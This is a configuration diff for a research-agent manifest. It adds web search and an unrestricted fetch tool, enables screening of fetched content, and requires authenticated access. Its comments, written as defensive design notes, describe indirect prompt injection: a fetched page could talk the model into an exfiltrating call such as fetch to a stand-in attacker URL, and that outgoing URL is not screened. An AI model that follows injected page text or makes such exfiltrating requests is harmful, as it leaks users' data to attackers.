@@ -17,11 +17,48 @@ spec:
     inline: |
       You are Felix, an expert planner and researcher.
       Break complex tasks into steps and execute them methodically.
+      Research before you assert: use `search` to find sources and `fetch` to read
+      them, and say which page a claim came from. If a search returns nothing
+      useful, say so rather than answering from memory.
       Always refer to yourself as Felix, never as Claude or any other name.
 
   tools:
     - calculator
     - list_skills
+
+  # A research agent that cannot retrieve is a contradiction; until these existed this
+  # manifest declared `pattern: deep` and could only do arithmetic. `search` finds sources,
+  # `fetch` reads them — the two halves are useless apart.
+  search_tools:
+    - name: search
+      description: >-
+        Search the web for sources. Returns ranked titles, URLs and snippets;
+        follow up with `fetch` to read a result rather than trusting the snippet.
+      max_results: 8
+
+  http_tools:
+    - name: fetch
+      description: >-
+        Read a web page found via `search`. Quote what the page says rather than
+        summarising from the snippet.
+      # Unconfined on purpose, and the one manifest here where that is the honest
+      # setting: research means reading pages nobody listed in advance. This is what
+      # `content_screening` below is for — every fetched page is treated as hostile.
+      allow_any_host: true
+      max_bytes: 80000
+      timeout_ms: 20000
+
+  # Required by the two tools above, not decoration. Search snippets are written by whoever
+  # ranked for the query and fetched pages are wholly attacker-controlled, so both arrive as
+  # untrusted output. Marker screening only (no `model:`), so it costs nothing per call.
+  #
+  # Read what this does and does not cover. It screens what comes *back*; the URL the model
+  # hands to `fetch` passes through no screener, so a page that talks the model into
+  # `fetch("https://attacker/?d=…")` is not stopped here. That is why inbound auth is on
+  # above, and why an operator wanting a stronger control sets `model:` and `on_flag: block`.
+  content_screening:
+    enabled: true
+    on_flag: quarantine
 
   memory:
     checkpointer: postgres
@@ -29,7 +66,10 @@ spec:
 
   auth:
     inbound:
-      allow_anonymous: true
+      # Deliberately *not* anonymous, unlike `quick` and `support`. Anonymous access to this
+      # manifest used to buy a calculator; with `fetch` bound unconfined it buys a
+      # general-purpose egress primitive, and the two are not the same offer.
+      allow_anonymous: false
 
   observability:
     trace: true
